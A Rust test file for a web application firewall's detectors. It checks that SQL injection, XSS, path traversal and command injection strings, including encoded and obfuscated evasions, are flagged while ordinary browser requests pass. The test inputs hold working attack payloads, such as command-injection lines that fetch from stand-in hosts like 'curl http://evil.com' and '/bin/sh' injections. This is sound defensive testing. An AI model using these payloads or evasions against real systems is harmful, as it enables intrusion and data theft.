use super::canonical::{LONG_BUFFER, with_long_buffer};
use super::*;
use crate::rule::Header;

#[test]
fn check_path_traversal_detects_traversal_patterns() {
    assert!(check_path_traversal(b"/app/static/../../etc/passwd").is_some());
    assert!(check_path_traversal(b"/api/%2e%2e/admin").is_some());
    assert!(check_path_traversal(b"/download?f=a%00.png").is_some());
    assert!(check_path_traversal(b"/safe/path/image.png").is_none());
}

#[test]
fn check_sqli_detects_injection_but_not_prose_or_content_negotiation() {
    assert!(check_sqli(b"admin' OR '1'='1").is_some());
    assert!(check_sqli(b"id=1 UNION SELECT null, username FROM users").is_some());
    assert!(check_sqli(b"q=x' and 1=1 order by 3 -- ").is_some());
    assert!(check_sqli(b"user=admin'--").is_some());
    assert!(check_sqli(b"name=JohnDoe").is_none());
    assert!(check_sqli(b"text/html,application/xml;q=0.9,*/*;q=0.8").is_none());
    assert!(check_sqli(b"please select a table from the menu").is_none());
    assert!(check_sqli(b"it's a group order from the shop").is_none());
    assert!(check_sqli(b"id=1 or 1=1").is_some());
    assert!(check_sqli(b"id=5 or b=2").is_none());
    assert!(check_sqli(b"I'd select the second option -- it's cheaper").is_none());
    assert!(check_sqli(b"name='x' union all from t--").is_some());
}

#[test]
fn check_xss_detects_script_injection_but_not_plain_markup_words() {
    assert!(check_xss(b"<script>alert(1)</script>").is_some());
    assert!(check_xss(b"<img src=x onerror=alert(1)>").is_some());
    assert!(check_xss(b"<svg/onload=alert(1)>").is_some());
    assert!(check_xss(b"<a href=\"javascript:alert(1)\">x</a>").is_some());
    assert!(check_xss(b"plain text input").is_none());
    assert!(check_xss(b"onboarding=1&alert(true)").is_none());
    assert!(check_xss(b"<div class=\"a\">hello</div>").is_none());
}

#[test]
fn check_rce_detects_command_injection_but_not_punctuation() {
    assert!(check_rce(b"127.0.0.1; /bin/sh").is_some());
    assert!(check_rce(b"input|curl http://evil.com").is_some());
    assert!(check_rce(b"x=$(cat /etc/hostname)").is_some());
    assert!(check_rce(b"host=a && whoami").is_some());
    assert!(check_rce(b"${jndi:ldap://x}").is_some());
    assert!(check_rce(b"status ok; done | next").is_none());
    assert!(check_rce(b"a=1&b=2&c=3").is_none());
}

#[test]
fn inspect_text_blocks_obfuscated_waf_evasion_attacks() {
    assert!(inspect_text(b"id=%27%20or%20%271%27=%271").is_some());
    assert!(inspect_text(b"1'/**/UnIoN/**/SeLeCt/**/1").is_some());
    assert!(inspect_text(b"/api/%252e%252e/%252e%252e/etc/passwd").is_some());
    assert!(inspect_text(b"<img%20src=x%20onerror=alert(1)>").is_some());
}

#[test]
fn automaton_and_sequential_scans_agree_on_every_signature() {
    let signatures = Signatures::new();
    for category in AttackCategory::ALL {
        for pattern in table(category) {
            let text = format!("prefix {pattern} suffix");
            let fast = inspect_text_with(&signatures, text.as_bytes()).unwrap();
            let slow = inspect_text(text.as_bytes()).unwrap();
            assert_eq!(fast.category, slow.category, "{pattern}");
        }
    }
}

#[test]
fn signature_tables_hold_no_duplicates_under_case_folding() {
    // The Zig automaton kept the last of two equal patterns and the Rust one keeps the
    // first; with no duplicates both report the same signature.
    let mut seen = std::collections::HashSet::new();
    for category in AttackCategory::ALL {
        for pattern in table(category) {
            assert!(seen.insert(pattern.to_ascii_lowercase()), "{pattern}");
        }
    }
}

#[test]
fn inspect_request_passes_a_real_browser_request_untouched() {
    let signatures = Signatures::new();
    let headers = [
        Header { name: b"Host", value: b"example.com" },
        Header {
            name: b"Accept",
            value: b"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\
                */*;q=0.8",
        },
        Header { name: b"Accept-Language", value: b"en-US,en;q=0.5" },
        Header { name: b"Accept-Encoding", value: b"gzip, deflate, br" },
        Header { name: b"Cookie", value: b"session=abc--def; theme=dark" },
        Header { name: b"Referer", value: b"https://example.com/blog?tag=c%2B%2B" },
        Header { name: b"Sec-Ch-Ua", value: b"\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\"" },
    ];
    let ua = b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like \
        Gecko) Chrome/128.0.0.0 Safari/537.36";
    let body = b"{\"comment\":\"I'd select the second option -- it's cheaper\"}";
    let request = RequestView {
        path: b"/blog/post-1",
        query: b"tag=c%2B%2B&page=2",
        user_agent: ua,
        headers: &headers,
        body,
        ..RequestView::default()
    };
    assert_eq!(inspect_request(&signatures, &request), None);
}

#[test]
fn inspect_request_still_catches_attacks_in_custom_headers_and_bodies() {
    let signatures = Signatures::new();
    let headers = [Header { name: b"X-Query", value: b"<script>alert(1)</script>" }];
    let request = RequestView { path: b"/search", headers: &headers, ..RequestView::default() };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Xss);
    let request =
        RequestView { path: b"/submit", body: b"cmd=test; /bin/sh", ..RequestView::default() };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Rce);
    let request = RequestView {
        path: b"/search",
        query: b"q=1%27%20union%20select%20null--",
        ..RequestView::default()
    };
    assert_eq!(inspect_request(&signatures, &request).unwrap().category, AttackCategory::Sqli);
}

#[test]
fn encoded_payload_after_two_kilobytes_is_canonicalised() {
    let mut payload = vec![b'a'; 4096];
    let attack = b"%3Cscript%3Ealert(1)%3C/script%3E";
    payload[3000..3000 + attack.len()].copy_from_slice(attack);
    assert!(inspect_text(&payload).is_some());
    assert!(inspect_text_with(&Signatures::new(), &payload).is_some());
}

/// Percent-encoded payloads that only the canonical pass can see: none of them is found raw.
const ENCODED_ATTACKS: [(AttackCategory, &[u8]); 4] = [
    (AttackCategory::Sqli, b"%27%20UNION%20SELECT%20password%20FROM%20users--"),
    (AttackCategory::Xss, b"%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    (AttackCategory::PathTraversal, b".%2e/.%2e/etc%2fpasswd"),
    (AttackCategory::Rce, b"%3B%20%2Fbin%2Fsh%20-c%20id"),
];

/// The length of a header value that fills a 16 KiB request head but for a short request
/// line and the header name.
const PADDED_LEN: usize = 16 * 1024 - 100;

fn padded(len: usize, offset: usize, payload: &[u8]) -> Vec<u8> {
    let mut text = vec![b'x'; len];
    text[offset..offset + payload.len()].copy_from_slice(payload);
    text
}

#[test]
fn encoded_payload_in_a_header_padded_beyond_eight_kilobytes_is_found() {
    let signatures = Signatures::new();
    for (category, payload) in ENCODED_ATTACKS {
        let offsets = [0, 8190, 8200, 12_000, PADDED_LEN - payload.len()];
        for offset in offsets {
            let value = padded(PADDED_LEN, offset, payload);
            let raw = inspect_raw(&signatures, &value, scan(&value));
            assert_eq!(raw, None, "{category} at {offset} must need canonicalisation");
            let found = inspect_category(&signatures, category, &value);
            assert_eq!(found.map(|v| v.category), Some(category), "{category} at {offset}");
            assert!(inspect_text_with(&signatures, &value).is_some(), "{category} at {offset}");
            assert!(inspect_text(&value).is_some(), "{category} at {offset}");
            let headers = [Header { name: b"X-Pad", value: &value }];
            let request = RequestView { path: b"/", headers: &headers, ..RequestView::default() };
            assert!(inspect_request(&signatures, &request).is_some(), "{category} at {offset}");
        }
    }
}

#[test]
fn a_field_beyond_the_head_bound_has_its_canonical_prefix_inspected() {
    let signatures = Signatures::new();
    let (category, payload) = ENCODED_ATTACKS[0];
    let len = MAX_CANONICAL + 4096;
    let inside = padded(len, MAX_CANONICAL - payload.len(), payload);
    assert!(inspect_category(&signatures, category, &inside).is_some());
    let beyond = padded(len, MAX_CANONICAL + 1, payload);
    assert_eq!(inspect_category(&signatures, category, &beyond), None);
}

#[test]
fn long_fields_reuse_one_buffer_per_thread() {
    let value = padded(PADDED_LEN, 9000, ENCODED_ATTACKS[0].1);
    let buffer_address = || {
        let buffer = LONG_BUFFER.with(std::cell::Cell::take);
        let address = buffer.as_ref().map(|buffer| buffer.as_ptr());
        LONG_BUFFER.with(|cell| cell.set(buffer));
        address
    };
    assert!(inspect_text(&value).is_some());
    let first = buffer_address();
    assert!(first.is_some(), "the buffer is kept after the call");
    assert!(inspect_text(&value).is_some());
    assert_eq!(buffer_address(), first, "the second call reuses the buffer");
    // A nested use finds the cell empty and works in a fresh buffer instead of panicking.
    let nested = with_long_buffer(|outer| {
        outer[0] = 1;
        with_long_buffer(|inner| inner.len())
    });
    assert_eq!(nested, MAX_CANONICAL);
}

/// Long padded fields: an encoded payload is found wherever it lies in the first
/// `MAX_CANONICAL` bytes, and full and per-category inspection agree, within a linear budget.
fn fuzz_long_fields(rounds: usize, seed: u64) {
    let signatures = Signatures::new();
    let padding = b"abcXYZ0189-_.=&, %41+";
    let mut state = seed;
    let mut next = |bound: usize| {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        (state % bound as u64) as usize
    };
    for _ in 0..rounds {
        let (category, payload) = ENCODED_ATTACKS[next(ENCODED_ATTACKS.len())];
        let len = 2049 + next(MAX_CANONICAL + 4096);
        let mut text: Vec<u8> = (0..len).map(|_| padding[next(padding.len())]).collect();
        let offset = next(len - payload.len());
        // A separator keeps the padding from gluing onto the payload's first word.
        text[offset..offset + payload.len()].copy_from_slice(payload);
        if offset > 0 {
            text[offset - 1] = b' ';
        }
        crate::steps::take();
        let fast = inspect_text_with(&signatures, &text);
        let single = inspect_category(&signatures, category, &text);
        assert!(crate::steps::take() <= 64 * 8 * (len as u64 + 1));
        if offset + payload.len() <= MAX_CANONICAL {
            assert!(single.is_some(), "{category} at {offset} of {len}");
        }
        if single.is_some() {
            assert!(fast.is_some());
        }
    }
}

#[test]
fn long_padded_fields_survive_fuzzing() {
    fuzz_long_fields(1000, 0x9e37_79b9_7f4a_7c15);
}

#[test]
#[ignore]
fn long_padded_fields_survive_heavy_fuzzing() {
    fuzz_long_fields(100_000, 0x2545_f491_4f6c_dd1d);
}

/// The finding of `request`'s fields, as the default engine sees them.
fn request_finding(query: &[u8], headers: &[Header<'_>], body: &[u8]) -> Option<AttackCategory> {
    let request = RequestView { path: b"/s", query, headers, body, ..RequestView::default() };
    inspect_request(&Signatures::new(), &request).map(|violation| violation.category)
}

#[test]
fn padded_queries_and_cookies_are_canonicalised_whole() {
    let sqli = b"q=1%27%20UNION%20SELECT%20password%20FROM%20users--";
    let mut query = b"pad=".to_vec();
    query.extend(std::iter::repeat_n(b'A', 8200));
    query.push(b'&');
    query.extend_from_slice(sqli);
    assert_eq!(request_finding(&query, &[], b""), Some(AttackCategory::Sqli));
    let mut cookie = b"a=".to_vec();
    cookie.extend(std::iter::repeat_n(b'A', 8200));
    cookie.extend_from_slice(b"; q=1%27%20UNION%20SELECT%201--");
    let headers = [Header { name: b"Cookie", value: &cookie }];
    assert_eq!(request_finding(b"", &headers, b""), Some(AttackCategory::Sqli));
}

#[test]
fn decoded_line_feeds_separate_shell_commands() {
    for query in [&b"host=127.0.0.1%0aid"[..], b"host=x%0awget%20http://evil/x", b"h=x%250Aid"] {
        assert_eq!(request_finding(query, &[], b""), Some(AttackCategory::Rce), "{query:?}");
    }
    let json = [Header { name: b"Content-Type", value: b"application/json" }];
    let body = br#"{"host":"127.0.0.1\nid"}"#;
    assert_eq!(request_finding(b"", &json, body), Some(AttackCategory::Rce));
    assert_eq!(request_finding(b"q=line%0aone%0atwo", &[], b""), None);
}

#[test]
fn content_encodings_are_decoded_before_inspection() {
    let json = [Header { name: b"Content-Type", value: b"application/json" }];
    let sqli = br#"{"q":"1\u0027\u0020UNION\u0020SELECT\u0020password\u0020FROM\u0020users"}"#;
    assert_eq!(request_finding(b"", &json, sqli), Some(AttackCategory::Sqli));
    let xss = br#"{"c":"\u003cscript\u003ealert(1)\u003c/script\u003e"}"#;
    assert_eq!(request_finding(b"", &json, xss), Some(AttackCategory::Xss));
    let quoted = br#"{"q":"x\' OR \'1\'=\'1"}"#;
    assert_eq!(request_finding(b"", &json, quoted), Some(AttackCategory::Sqli));
    let entities = b"id=1%26%23x27%3B%20or%20%26%23x27%3B1%26%23x27%3B%3D%26%23x27%3B1";
    assert_eq!(request_finding(entities, &[], b""), Some(AttackCategory::Sqli));
    let script = b"q=%26lt%3Bscript%26gt%3Balert(1)";
    assert_eq!(request_finding(script, &[], b""), Some(AttackCategory::Xss));
    let scheme = b"q=%3Ca%20href=jav%26%23x09%3bascript:alert(1)%3E";
    assert_eq!(request_finding(scheme, &[], b""), Some(AttackCategory::Xss));
    assert_eq!(request_finding(b"q=caf%26eacute%3B&b=%26amp%3B", &[], b""), None);
}

#[test]
fn reviewed_signature_gaps_are_closed() {
    let cases: [(&[u8], AttackCategory); 7] = [
        (b"q=%3Cimg%20src=1%20onerror%20=alert(1)%3E", AttackCategory::Xss),
        (b"q=%3Cx%20onclick=alert(1)%3E", AttackCategory::Xss),
        (b"id=1%20union(select%20password%20from%20users)", AttackCategory::Sqli),
        (b"id=1%20union/*!50000select*/%20password%20from%20users", AttackCategory::Sqli),
        (b"id=1%20or%202>1", AttackCategory::Sqli),
        (b"id=1%20or%201=1", AttackCategory::Sqli),
        (b"f=%25252e%25252e%25252f", AttackCategory::PathTraversal),
    ];
    for (query, category) in cases {
        assert_eq!(request_finding(query, &[], b""), Some(category), "{query:?}");
    }
}

#[test]
fn reviewed_body_evasions_are_inspected() {
    let png = [Header { name: b"Content-Type", value: b"image/png" }];
    let body = br#"{"q":"1' UNION SELECT password FROM users--"}"#;
    assert_eq!(request_finding(b"", &png, body), Some(AttackCategory::Sqli));
    let multipart = [Header { name: b"Content-Type", value: b"multipart/form-data; boundary=b" }];
    let padded = b"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n\r\n\
        hello\r\n--b \r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n1' UNION SELECT \
        password FROM users--\r\n--b--\r\n";
    assert_eq!(request_finding(b"", &multipart, padded), Some(AttackCategory::Sqli));
    let empty = b"--b\r\nContent-Disposition: form-data; name=\"q\"; filename=\"\"\r\n\r\n\
        1' UNION SELECT password FROM users--\r\n--b--\r\n";
    assert_eq!(request_finding(b"", &multipart, empty), Some(AttackCategory::Sqli));
}

/// Seeds for the detector fuzz: the reviewed evasions and near misses.
const REVIEWED: [&[u8]; 12] = [
    b"<img src=1 onerror =alert(1)>",
    b"<x title='<' onclick=alert(1)>",
    b"1 union all ((select 1",
    b"1 union/*!50000select*/ 1",
    b"x' or 'b'<>'a' or 2>=1",
    b"%26lt%3Bscript%26gt%3B&#x27;&#60&lt;",
    b"jav&#x09;ascript:alert(1)",
    b"\\u0027\\n\\'\\\\",
    b"host=127.0.0.1%0aid%250Awget",
    b"European Union (selected members)",
    b"<b>bold</b> onboarding=1 a<3",
    b"(((((((((((union(((((",
];

/// Mutated reviewed payloads: no panic, a linear work budget, and full inspection agrees
/// with per-category inspection.
#[test]
fn detectors_survive_mutated_reviewed_payloads() {
    let signatures = Signatures::new();
    let alphabet = b"<>()=&#;\\n/*! 'onuselctx0129%a:\\";
    let mut state = 0x6a09_e667_f3bc_c909u64;
    let mut next = |bound: usize| {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        (state % bound.max(1) as u64) as usize
    };
    for _ in 0..100_000 {
        let mut text = REVIEWED[next(REVIEWED.len())].to_vec();
        for _ in 0..1 + next(6) {
            let at = next(text.len() + 1);
            match next(4) {
                0 if at < text.len() => {
                    text.remove(at);
                }
                1 if text.len() < 2000 => {
                    let copy = text.clone();
                    text.splice(at..at, copy);
                }
                _ => text.insert(at, alphabet[next(alphabet.len())]),
            }
        }
        crate::steps::take();
        let fast = inspect_text_with(&signatures, &text);
        let categories = AttackCategory::ALL.map(|c| inspect_category(&signatures, c, &text));
        assert!(crate::steps::take() <= 8 * 64 * (text.len() as u64 + 1), "{text:?}");
        match fast {
            Some(found) => assert!(categories[found.category.index()].is_some(), "{text:?}"),
            None => assert!(categories.iter().all(Option::is_none), "{text:?}"),
        }
    }
}

#[test]
fn category_inspection_agrees_with_full_inspection_on_the_winning_category() {
    let signatures = Signatures::new();
    let samples: [&[u8]; 8] = [
        b"1'/**/UnIoN/**/SeLeCt/**/1",
        b"/x/../etc/passwd",
        b"<img%20src=x%20onerror=alert(1)>",
        b"a; wget http://x",
        b"id=1 or 1=1",
        b"plain",
        b"%00",
        b"a=1&id=5",
    ];
    for sample in samples {
        let full = inspect_text_with(&signatures, sample);
        if let Some(violation) = full {
            let single = inspect_category(&signatures, violation.category, sample);
            assert!(single.is_some(), "{sample:?}");
        } else {
            for category in AttackCategory::ALL {
                assert_eq!(inspect_category(&signatures, category, sample), None, "{sample:?}");
            }
        }
    }
}

#[test]
fn structural_headers_are_recognised_without_case() {
    assert!(is_structural_header(b"ACCEPT"));
    assert!(is_structural_header(b"Sec-Fetch-Mode"));
    assert!(!is_structural_header(b"Cookie"));
    assert!(!is_structural_header(b"User-Agent"));
}

#[test]
#[ignore]
fn component_timing() {
    let filler = b"the quick brown fox jumps over the lazy dog, and the form holds a note. ";
    let body: Vec<u8> = (0..8192).map(|i| filler[i % filler.len()]).collect();
    let signatures = Signatures::new();
    let time = |name: &str, f: &dyn Fn() -> usize| {
        let start = std::time::Instant::now();
        let mut sink = 0;
        for _ in 0..2000 {
            sink += f();
        }
        println!("{name}: {:.1} ns ({sink})", start.elapsed().as_nanos() as f64 / 2000.0);
    };
    time("classes", &|| usize::from(scan(std::hint::black_box(&body)).needs_canonical()));
    time("automaton", &|| {
        usize::from(signatures.find_first(std::hint::black_box(&body)).is_some())
    });
    time("tags", &|| usize::from(signatures.categories(std::hint::black_box(&body))));
    time("full", &|| {
        usize::from(inspect_text_with(&signatures, std::hint::black_box(&body)).is_some())
    });
}
